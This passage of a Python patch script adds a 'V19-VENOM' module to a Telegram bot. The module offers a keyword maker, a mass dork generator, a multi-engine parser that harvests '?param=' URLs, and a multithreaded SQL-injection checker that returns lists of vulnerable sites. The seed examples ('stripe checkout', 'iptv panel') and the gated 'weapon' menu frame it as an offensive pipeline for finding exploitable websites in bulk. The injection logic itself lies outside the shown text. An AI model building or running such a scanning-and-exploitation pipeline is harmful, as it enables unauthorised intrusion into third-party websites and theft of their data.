    return {"stats": st, "path": out_path, "hits": hits}


# ───────────────────────────────  TELEGRAM UI  ───────────────────────────────
def _v19_panel_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🧠 Kᴇʏᴡᴏʀᴅ Mᴀᴋᴇʀ", callback_data="v19_kw"),
         InlineKeyboardButton("🎯 Dᴏʀᴋ Gᴇɴᴇʀᴀᴛᴏʀ", callback_data="v19_dork")],
        [InlineKeyboardButton("🌍 Dᴇᴇᴘ Pᴀʀsᴇʀ ⚡", callback_data="v19_parse")],
        [InlineKeyboardButton("🛡️ Sǫʟɪ Cʜᴇᴄᴋᴇʀ", callback_data="v19_sqli")],
        [InlineKeyboardButton("⚙️ Eɴɢɪɴᴇ Sᴇᴛᴛɪɴɢs", callback_data="v19_cfg")],
        [InlineKeyboardButton("⬅️ Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data="menu_back")],
    ])


def _v19_panel_text() -> str:
    eff = _v19_effective()
    hw = eff["hw"]
    dev = "📱 Termux" if hw["termux"] else "🖥️ Server/PC"
    return (
        "☠️ <b>V19-VENOM ENGINE</b> ☠️\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 16 live engines • multi-page • auto-retry\n"
        "💎 Competitor-killer counters & live telemetry\n\n"
        "⚡ <b>Threads:</b> <code>%s</code> (min %s)\n"
        "📄 <b>Pages/engine:</b> <code>%s</code>\n"
        "🧩 <b>Profile:</b> <code>%s</code>\n"
        "💻 <b>Device:</b> %s • %s cores / %s GB RAM\n\n"
        "<i>Choose your weapon ⬇️</i>"
    ) % (eff["threads"], _V19_MIN_THREADS, eff["pages"], eff["profile"].upper(),
         dev, hw["cores"], hw["ram"])


def _v19_cfg_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟢 Lite 24", callback_data="v19_thr_24"),
         InlineKeyboardButton("🟡 40", callback_data="v19_thr_40"),
         InlineKeyboardButton("🟠 60", callback_data="v19_thr_60")],
        [InlineKeyboardButton("🔵 100", callback_data="v19_thr_100"),
         InlineKeyboardButton("🔥 160", callback_data="v19_thr_160"),
         InlineKeyboardButton("⚡ Auto", callback_data="v19_thr_0")],
        [InlineKeyboardButton("📄 Pages: 1", callback_data="v19_pg_1"),
         InlineKeyboardButton("📄 Pages: 2", callback_data="v19_pg_2"),
         InlineKeyboardButton("📄 Pages: 3", callback_data="v19_pg_3")],
        [InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="menu_v19")],
    ])


def _v19_clear_mode(context) -> None:
    try:
        context.user_data.pop("v19_mode", None)
    except Exception:
        pass


def _v19_mode(context) -> str:
    try:
        return str(context.user_data.get("v19_mode") or "")
    except Exception:
        return ""


async def _v19_guard(update) -> bool:
    uid = update.effective_user.id
    if has_access(uid):
        return True
    msg = update.effective_message
    try:
        await msg.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass
    return False


async def _v19_callback_router(update, context, data: str) -> int:
    q = update.callback_query
    uid = update.effective_user.id

    if data == "menu_v19":
        if not has_access(uid):
            await q.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ", show_alert=True)
            return MENU
        try:
            await q.edit_message_text(_v19_panel_text(), reply_markup=_v19_panel_kb(), parse_mode=ParseMode.HTML)
        except Exception:
            await q.message.reply_text(_v19_panel_text(), reply_markup=_v19_panel_kb(), parse_mode=ParseMode.HTML)
        return MENU

    if data == "v19_cfg":
        eff = _v19_effective()
        tmp = ("⚙️ <b>ENGINE SETTINGS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
               "⚡ Active threads: <code>%s</code>\n📄 Pages/engine: <code>%s</code>\n\n"
               "<i>Phone/Termux par 40-60 best. VPS par 100-160.</i>") % (eff["threads"], eff["pages"])
        await q.edit_message_text(tmp, reply_markup=_v19_cfg_kb(), parse_mode=ParseMode.HTML)
        return MENU

    if data.startswith("v19_thr_"):
        try:
            val = int(data.split("v19_thr_", 1)[1])
        except Exception:
            val = 0
        if val and val < _V19_MIN_THREADS:
            val = _V19_MIN_THREADS
        _v19_save_cfg({"threads": val})
        eff = _v19_effective()
        await q.answer("⚡ Threads: %s" % eff["threads"])
        await q.edit_message_text(
            ("⚙️ <b>ENGINE SETTINGS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
             "⚡ Active threads: <code>%s</code>\n📄 Pages/engine: <code>%s</code>\n\n"
             "<i>Saved ✅</i>") % (eff["threads"], eff["pages"]),
            reply_markup=_v19_cfg_kb(), parse_mode=ParseMode.HTML)
        return MENU

    if data.startswith("v19_pg_"):
        try:
            val = max(1, min(3, int(data.split("v19_pg_", 1)[1])))
        except Exception:
            val = 1
        _v19_save_cfg({"pages": val})
        eff = _v19_effective()
        await q.answer("📄 Pages: %s" % eff["pages"])
        await q.edit_message_text(
            ("⚙️ <b>ENGINE SETTINGS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
             "⚡ Active threads: <code>%s</code>\n📄 Pages/engine: <code>%s</code>\n\n"
             "<i>Saved ✅</i>") % (eff["threads"], eff["pages"]),
            reply_markup=_v19_cfg_kb(), parse_mode=ParseMode.HTML)
        return MENU

    if data == "v19_kw":
        if not await _v19_guard(update):
            return MENU
        context.user_data["v19_mode"] = "kw_count"
        context.user_data["v19_count"] = 5000
        await q.edit_message_text(
            "🧠 <b>KEYWORD MAKER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Step 1/2 — Kitne keywords chahiye?\n\n"
            "Examples: <code>5000</code>, <code>50000</code>, <code>1lakh</code>\n"
            "<i>(default 5000 — bas seed bhej do to 5000 ban jayenge)</i>",
            reply_markup=back_button(), parse_mode=ParseMode.HTML)
        return KW_WAIT_COUNT

    if data == "v19_dork":
        if not await _v19_guard(update):
            return MENU
        context.user_data["v19_mode"] = "dork_count"
        context.user_data["v19_count"] = 20000
        await q.edit_message_text(
            "🎯 <b>DORK GENERATOR</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Step 1/2 — Kitne dorks chahiye?\n\n"
            "Examples: <code>20000</code>, <code>50000</code>, <code>2lakh</code>\n"
            "<i>(default 20,000)</i>",
            reply_markup=back_button(), parse_mode=ParseMode.HTML)
        return DORK_WAIT_COUNT

    if data == "v19_parse":
        if not await _v19_guard(update):
            return MENU
        eff = _v19_effective()
        context.user_data["v19_mode"] = "parse"
        await q.edit_message_text(
            "🌍 <b>V19 DEEP PARSER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ Threads: <code>%s</code> • 📄 Pages: <code>%s</code>\n\n"
            "📥 <b>Dorks bhejo:</b>\n"
            "• <code>.txt</code> file (ek dork per line)\n"
            "• ya chat me direct paste karo\n\n"
            "🚀 <i>16 engines + auto-retry + live counters</i>" % (eff["threads"], eff["pages"]),
            reply_markup=back_button(), parse_mode=ParseMode.HTML)
        return PARSER_WAIT_DORKS

    if data == "v19_sqli":
        if not await _v19_guard(update):
            return MENU
        context.user_data["v19_mode"] = "sqli"
        await q.edit_message_text(
            "🛡️ <b>SQLi CHECKER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "📥 <code>?param=</code> URLs bhejo:\n"
            "• <code>.txt</code> file\n"
            "• ya chat me paste karo\n\n"
            "🔎 Error-based + Boolean-blind (MySQL/PG/MSSQL/Oracle/SQLite)",
            reply_markup=back_button(), parse_mode=ParseMode.HTML)
        return SQLI_WAIT_URLS

    if data in ("stop_parser", "v19_stop"):
        ev = _V19_STOP.get(uid)
        if ev:
            ev.set()
        try:
            await q.answer("🛑 Stopping...")
        except Exception:
            pass
        return MENU

    return MENU


async def _v19_do_deep_parse(update, context, dorks: list) -> int:
    uid = update.effective_user.id
    eff = _v19_effective()
    ev = asyncio.Event()
    _V19_STOP[int(uid)] = ev
    chat_id = update.effective_chat.id
    status = await context.bot.send_message(
        chat_id=chat_id,
        text="🌍 <b>DEEP PARSER STARTING</b>\n⚡ Threads: <code>%s</code> • Dorks: <code>%s</code>\n\n<code>[%s]</code> 0%%"
             % (eff["threads"], format(len(dorks), ","), _v19_bar(0)),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="v19_stop")]]),
    )
    msg_id = status.message_id
    last = {"t": 0.0}

    async def _progress(snap: dict) -> None:
        await _v19_edit(status, snap)

    async def _v19_edit(m, snap: dict) -> None:
        now = time.time()
        if now - last["t"] < 2.5:
            return
        last["t"] = now
        _V19_LIVE[int(uid)] = dict(snap)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=_v19_running_text(snap), parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    try:
        result = await _v19_deep_parse(dorks, uid, progress=_progress)
    except Exception as exc:
        logger.exception("V19 deep parse failed: %s", exc)
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                                                text="❌ Parser error: <code>%s</code>" % str(exc)[:300],
                                                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return MENU
    finally:
        _V19_STOP.pop(int(uid), None)

    st = result["stats"]
    try:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                                            text=_v19_done_text(st, st.get("elapsed", 0.0)),
                                            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    for path, caption in ((result["param_path"], "🎯 V19 ?param= URLs"),
                          (result["all_path"], "🌍 V19 All Unique URLs")):
        try:
            with open(path, "rb") as fh:
                await context.bot.send_document(chat_id=chat_id, document=fh,
                                                filename=os.path.basename(path), caption=caption)
        except Exception:
            pass
    return MENU


async def _v19_do_keywords(update, context, seeds: list, count: int) -> int:
    chat_id = update.effective_chat.id
    note = await context.bot.send_message(chat_id=chat_id, text="🧠 Generating %s UHQ keywords..." % format(count, ","))
    kws = _v19_make_keywords(seeds, count)
    path = os.path.join(_V19_OUT_DIR, "V19_Keywords_%s_%s.txt" % (len(kws), datetime.now().strftime("%Y%m%d_%H%M%S")))
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(kws) + ("\n" if kws else ""))
    try:
        await note.edit_text("✅ <b>%s UHQ keywords ready</b>\n💎 Commercial intent + DB footprint\n\n<i>Ab isse Dork Generator me daal do ⬇️</i>" % format(len(kws), ","),
                             parse_mode=ParseMode.HTML)
    except Exception:
        pass
    try:
        with open(path, "rb") as fh:
            await context.bot.send_document(chat_id=chat_id, document=fh,
                                            filename=os.path.basename(path),
                                            caption="🧠 %s keywords" % format(len(kws), ","))
    except Exception:
        pass
    return MENU


async def _v19_do_dorks(update, context, keywords: list, count: int) -> int:
    chat_id = update.effective_chat.id
    ev = asyncio.Event()
    _V19_STOP[int(update.effective_user.id)] = ev
    path = os.path.join(_V19_OUT_DIR, "V19_Dorks_%s_%s.txt" % (count, datetime.now().strftime("%Y%m%d_%H%M%S")))
    note = await context.bot.send_message(chat_id=chat_id, text="🎯 Generating %s dorks..." % format(count, ","))
    written = 0
    for _attempt in (0, 1):
        try:
            if _attempt == 0 and hasattr(asyncio, "to_thread"):
                written = await asyncio.to_thread(_v19_stream_dorks, keywords, count, path, "mix")
            else:
                loop = asyncio.get_running_loop()
                written = await loop.run_in_executor(None, _v19_stream_dorks, keywords, count, path, "mix")
            break
        except Exception as exc:
            if _attempt == 1:
                _V19_STOP.pop(int(update.effective_user.id), None)
                try:
                    await note.edit_text("❌ Dork error: %s" % str(exc)[:200])
                except Exception:
                    pass
                return MENU
    _V19_STOP.pop(int(update.effective_user.id), None)
    try:
        await note.edit_text("✅ <b>%s dorks ready</b>\n🌍 Universal mix (Google inurl + Bing instreamset)\n\n<i>Ab Deep Parser me daal do ⬇️</i>" % format(written, ","),
                             parse_mode=ParseMode.HTML)
    except Exception:
        pass
    try:
        with open(path, "rb") as fh:
            await context.bot.send_document(chat_id=chat_id, document=fh,
                                            filename=os.path.basename(path),
                                            caption="🎯 %s dorks" % format(written, ","))
    except Exception:
        pass
    return MENU


async def _v19_do_sqli(update, context, urls: list) -> int:
    uid = update.effective_user.id
    chat_id = update.effective_chat.id
    ev = asyncio.Event()
    _V19_STOP[int(uid)] = ev
    eff = _v19_effective()
    msg = await context.bot.send_message(
        chat_id=chat_id,
        text="🛡️ <b>SQLi CHECKER</b>\n⚡ Threads: <code>%s</code>\n<code>[%s]</code> 0%%"
             % (eff["threads"], _v19_bar(0)),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="v19_stop")]]),
    )
    mid = msg.message_id
    last = {"t": 0.0}

    async def _progress(s: dict) -> None:
        now = time.time()
        if now - last["t"] < 3.0:
            return
        last["t"] = now
        pct = s["scanned"] * 100.0 / max(1, s["total"])
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=mid, parse_mode=ParseMode.HTML,
                text=("🛡️ <b>SQLi CHECKER — RUNNING</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                      "📥 <b>Tested:</b> <code>%s/%s</code>\n💀 <b>Vulns:</b> <code>%s</code>\n"
                      "⚡ <b>Threads:</b> <code>%s</code>\n\n<code>[%s]</code> <b>%d%%</b>")
                     % (format(s["scanned"], ","), format(s["total"], ","),
                        format(s["vulns"], ","), s["threads"], _v19_bar(pct), int(pct)))
        except Exception:
            pass

    try:
        res = await _v19_sqli_scan(urls, uid, progress=_progress)
    finally:
        _V19_STOP.pop(int(uid), None)
    st = res["stats"]
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=mid, parse_mode=ParseMode.HTML,
            text=("🛡️ <b>SQLi CHECKER — COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                  "📥 <b>Tested:</b> <code>%s</code>\n💀 <b>Vulnerable:</b> <code>%s</code>\n"
                  "⚠️ <b>Errors:</b> <code>%s</code>\n⚡ <b>Threads:</b> <code>%s</code> • ⏱ <code>%.1fs</code>\n"
                  "<code>[%s]</code> <b>100%%</b>\n📦 <i>File ready ⬇️</i>")
                 % (format(st["scanned"], ","), format(st["vulns"], ","), format(st["errors"], ","),
                    st["threads"], st.get("elapsed", 0.0), _v19_bar(100)))
    except Exception:
        pass
    if st["vulns"]:
        try:
            with open(res["path"], "rb") as fh:
                await context.bot.send_document(chat_id=chat_id, document=fh,
                                                filename=os.path.basename(res["path"]),
                                                caption="💀 %s vulnerable URLs" % format(st["vulns"], ","))
        except Exception:
            pass
    return MENU


# ─────────────────────  WRAPPERS (hook into existing states)  ────────────────
_v19_prev_button_handler = button_handler


async def button_handler(update, context):
    q = getattr(update, "callback_query", None)
    data = (q.data or "") if q else ""
    if data.startswith("v19_") :
        try:
            await q.answer()
        except Exception:
            pass
        try:
            return await _v19_callback_router(update, context, data)
        except Exception as exc:
            logger.exception("V19 callback error: %s", exc)
            return MENU
    return await _v19_prev_button_handler(update, context)


def _v19_wrap(name: str, handler):
    prev = globals().get(name)
    if prev is None:
        return
    mode_expected = handler

    async def _wrapper(update, context):
        mode = _v19_mode(context)
        if mode == mode_expected:
            _v19_clear_mode(context)
            return await _v19_dispatch(mode, update, context)
        return await prev(update, context)

    _wrapper.__name__ = name
    globals()[name] = _wrapper


async def _v19_dispatch(mode: str, update, context) -> int:
    uid = update.effective_user.id
    if not has_access(uid):
        await update.effective_message.reply_text(access_denied_text(), reply_markup=access_denied_kb(),
                                                  parse_mode=ParseMode.MARKDOWN)
        return MENU
    msg = update.effective_message
    if mode == "parse":
        dorks = _v19_read_input(msg)
        if not dorks:
            await msg.reply_text("❌ Koi dork nahi mila — dobara bhejo.")
            return MENU
        return await _v19_do_deep_parse(update, context, dorks)
    if mode == "sqli":
        urls = _v19_read_input(msg)
        if not urls:
            await msg.reply_text("❌ Koi URL nahi mila.")
            return MENU
        return await _v19_do_sqli(update, context, urls)
    if mode == "kw_seeds":
        seeds = _v19_read_input(msg)
        count = int(context.user_data.get("v19_count") or 5000)
        return await _v19_do_keywords(update, context, seeds, count)
    if mode == "dork_keywords":
        kws = _v19_read_input(msg)
        count = int(context.user_data.get("v19_count") or 20000)
        return await _v19_do_dorks(update, context, kws, count)
    return MENU


def _v19_read_input(msg) -> list:
    if msg is None:
        return []
    if getattr(msg, "document", None):
        return _v19_read_doc_path(getattr(msg.document, "file_id", ""))
    txt = (getattr(msg, "text", "") or "").strip()
    return [ln.strip() for ln in txt.splitlines() if ln.strip()]


_V19_DOC_CACHE: Dict[str, list] = {}


def _v19_cache_doc(file_id: str, lines: list) -> None:
    if file_id:
        _V19_DOC_CACHE[file_id] = lines
        if len(_V19_DOC_CACHE) > 12:
            _V19_DOC_CACHE.pop(next(iter(_V19_DOC_CACHE)))


def _v19_read_doc_path(file_id: str) -> list:
    return list(_V19_DOC_CACHE.get(file_id) or [])


# document handlers need async download; wrap them separately
def _v19_wrap_doc(name: str, mode_expected: str):
    prev = globals().get(name)
    if prev is None:
        return

    async def _wrapper(update, context):
        mode = _v19_mode(context)
        if mode != mode_expected:
            return await prev(update, context)
        _v19_clear_mode(context)
        uid = update.effective_user.id
        if not has_access(uid):
            await update.effective_message.reply_text(access_denied_text(), reply_markup=access_denied_kb(),
                                                      parse_mode=ParseMode.MARKDOWN)
            return MENU
        msg = update.effective_message
        lines = []
        try:
            doc = msg.document
            tg_file = await context.bot.get_file(doc.file_id)
            tmp_dir = os.path.join(_V19_OUT_DIR, "in")
            os.makedirs(tmp_dir, exist_ok=True)
            dst = os.path.join(tmp_dir, "%s_%s" % (uid, re.sub(r"[^A-Za-z0-9._-]", "_", doc.file_name or "in.txt")))
            if hasattr(tg_file, "download_to_drive"):
                await tg_file.download_to_drive(dst)
            else:
                await tg_file.download(custom_path=dst)
            if dst.lower().endswith(".zip"):
                with zipfile.ZipFile(dst, "r") as zf:
                    for nm in zf.namelist():
                        if nm.lower().endswith((".txt", ".csv")):
                            lines.extend(x.strip() for x in zf.read(nm).decode("utf-8", "ignore").splitlines() if x.strip())
            else:
                with open(dst, "r", encoding="utf-8", errors="ignore") as fh:
                    lines.extend(x.strip() for x in fh if x.strip())
        except Exception as exc:
            logger.warning("V19 doc read failed: %s", exc)
        if not lines:
            await msg.reply_text("❌ File khali hai ya read nahi hui — .txt dobara bhejo.")
            return MENU
        return await _v19_dispatch(mode_expected, update, context)

    _wrapper.__name__ = name
    globals()[name] = _wrapper


_v19_wrap("parser_get_dorks_text", "parse")
_v19_wrap("sqli_get_urls_text", "sqli")
_v19_wrap("kw_get_seeds_text", "kw_seeds")
_v19_wrap("dork_get_keywords_text", "dork_keywords")

_v19_wrap_doc("parser_get_dorks_file", "parse")
_v19_wrap_doc("sqli_get_urls_file", "sqli")
_v19_wrap_doc("kw_get_seeds_file", "kw_seeds")
_v19_wrap_doc("dork_get_keywords_file", "dork_keywords")


# count steps (reuse existing states)
_v19_prev_kw_get_count = globals().get("kw_get_count")
if _v19_prev_kw_get_count is not None:
    async def kw_get_count(update, context):
        if _v19_mode(context) != "kw_count":
            return await _v19_prev_kw_get_count(update, context)
        try:
            n = _v8_parse_human_count(update.effective_message.text)
        except Exception:
            n = 5000
        n = max(10, min(int(n), 2_000_000))
        context.user_data["v19_count"] = n
        context.user_data["v19_mode"] = "kw_seeds"
        await update.effective_message.reply_text(
            "🧠 <b>KEYWORD MAKER</b> — Step 2/2\nCount set: <code>%s</code>\n\n"
            "📥 Ab <b>seed keywords</b> bhejo (comma/newline) ya <code>.txt</code> file\n"
            "<i>Example: stripe checkout, gaming topup, iptv panel</i>" % format(n, ","),
            reply_markup=back_button(), parse_mode=ParseMode.HTML)
        return KW_WAIT_SEEDS


_v19_prev_dork_get_count = globals().get("dork_get_count")
if _v19_prev_dork_get_count is not None:
    async def dork_get_count(update, context):
        if _v19_mode(context) != "dork_count":
            return await _v19_prev_dork_get_count(update, context)
        try:
            n = _v8_parse_human_count(update.effective_message.text)
        except Exception:
            n = 20000
        n = max(50, min(int(n), 5_000_000))
        context.user_data["v19_count"] = n
        context.user_data["v19_mode"] = "dork_keywords"
        await update.effective_message.reply_text(
            "🎯 <b>DORK GENERATOR</b> — Step 2/2\nCount set: <code>%s</code>\n\n"
            "📥 Ab <b>keywords</b> bhejo (ya keywords ki <code>.txt</code> file)\n"
            "<i>Tip: Keyword Maker ka output file seedha yahan bhej do.</i>" % format(n, ","),
            reply_markup=back_button(), parse_mode=ParseMode.HTML)
        return DORK_WAIT_KEYWORDS


_v19_prev_make_main_menu = make_main_menu


def make_main_menu():
    try:
        base = _v19_prev_make_main_menu()
        rows = list(base.inline_keyboard)
    except Exception:
        return _v19_prev_make_main_menu()
    extra = [InlineKeyboardButton("☠️ V19-VENOM ENGINE ⚡", callback_data="menu_v19")]
    if not any(getattr(b, "callback_data", "") == "menu_v19" for r in rows for b in r):
        rows.insert(1, extra)
    try:
        return InlineKeyboardMarkup(rows)
    except Exception:
        return base


logger.info("☠️ V19-VENOM engine loaded (threads=%s, pages=%s, termux=%s)",
            _v19_effective()["threads"], _v19_effective()["pages"], _V19_HW["termux"])
'''


def find_insert_index(src: str) -> int:
    m = re.search(r'^if __name__ == ["\']__main__["\']:', src, re.M)
    if not m:
        raise SystemExit("❌ `if __name__ == \"__main__\":` block nahi mila — target file galat lagti hai.")
    return m.start()


def patch(target: str) -> None:
    if not os.path.isfile(target):
        raise SystemExit(f"❌ {target} nahi mila")

    with open(target, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()

    # 1) idempotency — strip any old V19 block
    src = re.sub(
        r"\n# ═+\n#  ██╗   ██╗ ██╗ █████╗ .*?logger\.info\(\"☠️ V19-VENOM engine loaded.*?\n",
        "\n",
        src,
        flags=re.S,
    )

    # 2) version tag bump
    src = src.replace('_V12_VERSION_TAG = "V18-TITAN"', '_V12_VERSION_TAG = "V19-VENOM"')
    src = src.replace('_V12_VERSION_TAG = "V19-VENOM-VENOM"', '_V12_VERSION_TAG = "V19-VENOM"')

    # 3) inject block before __main__
    idx = find_insert_index(src)
    src = src[:idx] + V19_BLOCK.strip("\n") + "\n\n\n" + src[idx:]

    # 4) backup (never overwrite old backups)
    backup = f"{target}.v18_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    shutil.copyfile(target, backup)

    # 5) write
    with open(target, "w", encoding="utf-8") as f:
        f.write(src)

    # 6) compile verify
    try:
        py_compile.compile(target, doraise=True)
    except Exception as exc:
        shutil.copyfile(backup, target)
        raise SystemExit(f"❌ Compile fail — rollback kiya. Error: {exc}")

    print("=" * 70)
    print("  ✅ V19-VENOM PATCH APPLIED")
    print("=" * 70)
    print(f"  Target  : {target}")
    print(f"  Backup  : {backup}")
    print(f"  Size    : {os.path.getsize(target):,} bytes")
    print("  Added   : menu_v19 panel, deep parser (16 engines), keyword maker,")
    print("            dork generator, SQLi checker, engine settings (min 20 threads)")
    print("=" * 70)
    print("  Ab chalao:  python3 bot_fixed.py")


if __name__ == "__main__":
    patch(sys.argv[1] if len(sys.argv) > 1 else "bot_fixed.py")
